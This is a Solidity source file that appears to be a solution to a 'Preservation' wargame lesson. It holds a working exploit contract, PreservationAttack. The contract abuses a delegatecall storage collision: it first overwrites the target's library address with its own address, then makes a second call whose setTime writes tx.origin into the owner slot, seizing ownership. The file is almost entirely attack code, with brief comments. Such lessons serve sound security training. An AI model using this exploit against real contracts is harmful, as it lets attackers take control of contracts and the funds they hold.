// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/16-Preservation.sol";

contract PreservationAttack {
    uint256 var1;
    uint256 var2;
    address public owner;
    Preservation preservation;

    constructor(address _preservationAddress) public {
        preservation = Preservation(_preservationAddress);
    }

    function setTime(uint256) public {
        owner = tx.origin;
    }

    function getTimeStamp(address sender) public pure returns (uint256) {
        return uint256(sender);
    }

    function attack() public {
        // set timeZone1Library variable in preservation contract to this contract's address
        preservation.setFirstTime(getTimeStamp(address(this)));
        // now calling setFirstTime will delegatecall setTime() from this contract instead
        // this contracts setTime() function changes the owner to msg.sender (attacker)
        preservation.setFirstTime(getTimeStamp(msg.sender));
    }
}
